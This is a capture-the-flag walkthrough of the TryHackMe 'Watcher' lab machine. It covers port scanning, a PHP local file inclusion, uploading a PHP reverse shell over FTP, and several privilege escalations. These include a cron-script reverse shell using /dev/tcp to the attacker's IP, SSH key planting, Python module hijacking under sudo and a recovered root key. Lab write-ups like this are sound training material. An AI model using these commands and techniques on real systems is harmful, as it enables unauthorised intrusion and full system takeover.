# Watcher

[Play](https://tryhackme.com/room/watcher)

## 1. Enumeration & Exploration
### 1.1. Port Scanning
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.157.202
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 11:48 EDT
Nmap scan report for 10.10.157.202
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
5815/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.88 seconds
```

ftp, ssh, https. Notin too special. Let's look at web stuff.


### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.157.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -q         
/images               (Status: 301) [Size: 315] [--> http://10.10.157.202/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.157.202/css/]   
/server-status        (Status: 403) [Size: 278]   
```

This was fairly slow ... and in the end unhelpful. Doing simultaneous exploration is a good idea!


### 1.3. Web Exploration
The homepage,
![homepage of the THM Watcher room](https://i.imgur.com/c9ZFchq.png)

`robots.txt` is usually a good place to look.
![A screenshot of the page showing robots.txt file](https://i.imgur.com/fPeuBjd.png)


Yes! We have our first flag!

Exploring more, we have the post structure ... sus. LFI?
![A page showing probable PHP LFI](https://i.imgur.com/P6M7dH9.png)

### 1.4. PHP LFI
Let's try some basic stuff. `../../../etc/hosts` works!

![/etc/hosts working. LFI present in the system.](https://i.imgur.com/TXKROye.png)

How about `../../../etc/passwd`
![/etc/password working. Showing a list of interesting users.](https://i.imgur.com/mDVT7Sp.png)

Interesting candidates:
- mat
- toby
- will

Just to check, I tried getting `flag_1.txt`. Worked. Then, I looked at the second file mentioned in the same `robots.txt`

![](https://i.imgur.com/5n8Xta1.png)
We get the creds for ftp!

### 1.5 FTP
Log in.
```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.157.202
Connected to 10.10.157.202.
220 (vsFTPd 3.0.3)
Name (10.10.157.202:kali): *******
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt
ftp> cd files
ftp> ls -la
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
226 Directory send OK.
```

Clearly, the message in the file we saw on the web server hinted at directories being connected. We also have the ability to access local files ...

### 1.6 LFI + FTP = RCE?
I tried putting in a file,
```
ftp> put haha.png 
local: haha.png remote: haha.png
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
11007 bytes sent in 0.00 secs (37.4896 MB/s)
```

![File upload working using LFI vulnerability and FTP](https://i.imgur.com/qDyqE9I.png)

Works!

## 2. Foothold
Time to get in. Get the shell from [RevShells](http://revshells.com/)

```
ftp> cd files
250 Directory successfully changed.
ftp> put phprevshell.php 
local: phprevshell.php remote: phprevshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2585 bytes sent in 0.00 secs (34.7218 MB/s)
ftp> 
221 Goodbye.
```

Start the listener.
```                   
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 42726
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:25:10 up 39 min,  0 users,  load average: 0.00, 0.00, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (914): Inappropriate ioctl for device
bash: no job control in this shell
www-data@watcher:/$ 
```
And we have the flag!
```
www-data@watcher:/$ find -type f -name 'flag_3.txt' 2>/dev/null
./var/www/html/more_secrets_******/flag_3.txt
```

ez

## 3. Priv Esc
### 3.1. Lateral PrivEsc: Toby
Time to start getting to root.
```
www-data@watcher:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

And that was pretty basic ...

```
www-data@watcher:/$ sudo -u toby bash
sudo -u toby bash
whoami
toby
```

Great. How about now looking at what toby got for us.

```
toby@watcher:~$ ls
ls
flag_4.txt
jobs
note.txt
```

```
toby@watcher:~$ cat note.txt
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

Exploring, we find the following. What a script. wow.

```
toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

The note mentions something to do with cron job. Let's check `crontab`.

```
toby@watcher:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

### 3.2. Lateral PrivEsc (again): Mat
We put a revshell command and ... we wait!
```
toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
sh -i >& /dev/tcp/10.17.8.184/1234 0>&1
```

Listening.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 55854
sh: 0: can't access tty; job control turned off
$ whoami
mat
```

We are in! Let's explore.

```
mat@watcher:~$ cat note.txt
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Why do they tell us what to do EXACTLY XD

```
mat@watcher:~/scripts$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```


```
mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
mat@watcher:~/scripts$ cat will_script.py
cat will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

Scripts are pretty straight forward. We can't change all the return statements. 

Clearly, we need to have a bash command/another rev shell command somewhere before. This requires editing stuff.

```
mat@watcher:~/scripts$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
mat@watcher:~/scripts$ nano cmd.py
nano cmd.py
Error opening terminal: unknown.
```

Well ... time to ssh in. Follow the tanget to setup ssh below.

```
mat@watcher:~$ mkdir .ssh
mkdir .ssh
mat@watcher:~$ cd .ssh
cd .ssh
mat@watcher:~/.ssh$ echo "ssh-rsa {blah blah blah} kali@kali" > authorized_keys
{some truncated stuff} kali@kali" > authorized_keys
mat@watcher:~/.ssh$ 
```

[SSH permissions setting](https://community.perforce.com/s/article/6210)

```
mat@watcher:~/.ssh$ chmod 600 au
chmod 600 authorized_keys 
```

```
mat@watcher:~$ chmod 700 .ssh
chmod 700 .ssh
```

```
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh mat@10.10.157.202                           

...

mat@watcher:~$ 
```

YES!

### 3.3 Lateral PrivEsc (again) (again): Will
We edit and spawn a shell.
```
mat@watcher:~/scripts$ cat cmd.py 
import pty
def get_command(num):
        pty.spawn("/bin/bash")
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

```
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
will@watcher:~/scripts$ 
```

noice.

### 3.4 Vertical PrivEsc

![Transferring files to the remote machine using python http server](https://i.imgur.com/SPVaaSW.png)

I did same for linpeas (my fav).

```
[+] Readable files belonging to root and readable by me but not world readable
-rw-rw---- 1 root adm 2270 Dec  3 02:04 /opt/backups/key.b64                                                                                                            
-rw-r----- 1 root adm 21919802 May 25 16:59 /var/log/apache2/access.log
-rw-r----- 1 root adm 29610 May 25 16:59 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Dec  3 01:39 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 28898 Dec 12 15:23 /var/log/apt/term.log

```

First file looks interesting. Lesse

```
will@watcher:/home/will$ cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
...
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```
Looks like a id_rsa key format. Decoding base64, we get a private key!

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@10.10.157.202
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

...

Last login: Thu Dec  3 03:25:38 2020
root@watcher:~#
```

System fully compromised!
